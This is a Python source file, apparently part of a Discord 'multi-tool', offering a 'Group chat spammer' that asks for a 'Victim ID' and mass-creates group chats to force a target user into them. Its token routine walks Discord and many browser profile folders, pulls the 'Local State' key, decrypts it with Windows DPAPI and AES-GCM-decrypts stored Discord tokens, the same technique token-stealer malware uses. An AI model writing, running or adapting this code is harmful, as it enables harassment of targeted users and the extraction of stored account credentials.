import os
import time
import requests
import sys
import asyncio
import httpx
import win32crypt
import base64
import re
from Crypto.Cipher import AES
import json
from config.settings import *

myToken = None

def my_token():
    global myToken
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    def getkey(path):
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()

        return key

    def gettokens(path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []

        if not os.path.exists(path):
            return tokens

        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue

            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue
        return tokens
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)
            except Exception as e:
                print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Failed to grab token{Style.RESET_ALL}")
                time.sleep(2)
                return
    myToken = token

def spam_gc():
        os.system("cls")
        Slow(discord_banner)
        time.sleep(1.5)
        os.system("cls")
        print(f"{bracketopen}!{bracketclosed} {Fore.BLUE}Group chat spammer{Style.RESET_ALL}")
        print("")

        try:
            my_token()
        except Exception:
            print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Failed to grab token{Style.RESET_ALL}")
            time.sleep(2)
            return
        
        if myToken is None:
            print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Failed to grab token{Style.RESET_ALL}")
            time.sleep(2)
            return
        
        try:
            id = int(input(f"{bracketopen}>{bracketclosed} {Fore.BLUE}Victim ID -> {Style.RESET_ALL}"))
            try:
                group_number = int(input(f"{bracketopen}>{bracketclosed} {Fore.BLUE}Number of groups -> {Style.RESET_ALL}"))

                if group_number > 100:
                    print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Number of groups too high{Style.RESET_ALL}")
                    time.sleep(2)
                    return
                if group_number < 1:
                    print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Number of groups too low{Style.RESET_ALL}")
                    time.sleep(2)
                    return
                
                print("")

                try:
                    print(f"{bracketopen}~{bracketclosed} {Fore.BLUE}Spamming groupchats... {Style.RESET_ALL}")
                    
                    print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
                    time.sleep(0.05)
                    asyncio.run(add_user_to_group(token=myToken, target_user_id=id, groups=group_number))
                    time.sleep(0.05)
                    print("────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
                    time.sleep(0.05)

                    print("")
                    print(f"{bracketopen}{Fore.WHITE}01{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Main Menu{Style.RESET_ALL}")
                    print(f"{bracketopen}{Fore.WHITE}02{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Exit{Style.RESET_ALL}")
                    print("")

                    command = input(f"""{Fore.BLUE} ┌──({Fore.WHITE}{username}{Fore.BLUE})─[{Fore.WHITE}~/{system_text}/{pc_name}{Fore.BLUE}]
 └─{Fore.WHITE}$ {Style.RESET_ALL}""")

                    if command == "1" or command == "01":
                        pass
                    elif command == "2" or command == "02":
                        sys.exit()
                    else:
                        pass

                except Exception:
                    print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Failed to create groups{Style.RESET_ALL}")
                    time.sleep(2)
                    return

            except Exception:
                print("")
                print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Invalid number{Style.RESET_ALL}")
                time.sleep(2)
                return

        except Exception:
            print("")
            print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Invalid ID{Style.RESET_ALL}")
            time.sleep(2)
            return
        
async def add_user_to_group(token, target_user_id, groups):
    headers = {"Authorization": token}
    res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers, timeout=5)
    BASE_URL = "https://discord.com/api/v9"

    if res.status_code == 200:
        res_json = res.json()
        user_id = res_json['id']

        async with httpx.AsyncClient() as client:
            for i in range(groups):
                        create_url = f"{BASE_URL}/users/@me/channels"
                        payload = {
                            "recipients": [target_user_id, user_id] 
                        }

                        try:
                            response = await client.post(create_url, headers=headers, json=payload)
                            
                            if response.status_code in [200, 201]:
                                group_data = response.json()
                                group_id = group_data.get("id")
                                
                                add_url = f"{BASE_URL}/channels/{group_id}/recipients/{target_user_id}"
                                add_response = await client.put(add_url, headers=headers)

                                leave_url = f"{BASE_URL}/channels/{group_id}/recipients/{user_id}"
                                leave_response = await client.delete(leave_url, headers=headers)
                                
                                if add_response.status_code == 204:
                                    print(f"{bracketopen2}{Fore.BLUE}+{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} User got added to group : {Style.RESET_ALL}{group_id}")

                                    if leave_response.status_code == 204:
                                       pass
                                    else:
                                        print(f"{bracketopen2}{Fore.BLUE}+{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} Failed to leave group : {Style.RESET_ALL}{group_id}")
                                        
                                else:
                                    print(f"{bracketopen2}{Fore.BLUE}!{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} Failed to add user to  :{Style.RESET_ALL}{group_id}")
                            
                            elif response.status_code == 429:
                                retry_after = response.json().get("retry_after", 5)
                                await asyncio.sleep(retry_after)
                            else:
                                print(f"{bracketopen2}{Fore.BLUE}!{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} Error creating groups{Style.RESET_ALL}")
                                await asyncio.sleep(2)
                                return

                            await asyncio.sleep(0.3)
                        except Exception as e:
                            print(f"{bracketopen2}{Fore.BLUE}!{Style.RESET_ALL}{bracketclosed2}{Fore.BLUE} Error creating groups{Style.RESET_ALL}")
                            await asyncio.sleep(2)
                            return

    elif res.status_code == 404:
         print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Invalid victim ID{Style.RESET_ALL}")
         await asyncio.sleep(2)
         return

    else:
        print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.BLUE} Failed to create groups{Style.RESET_ALL}")
        await asyncio.sleep(2)
        return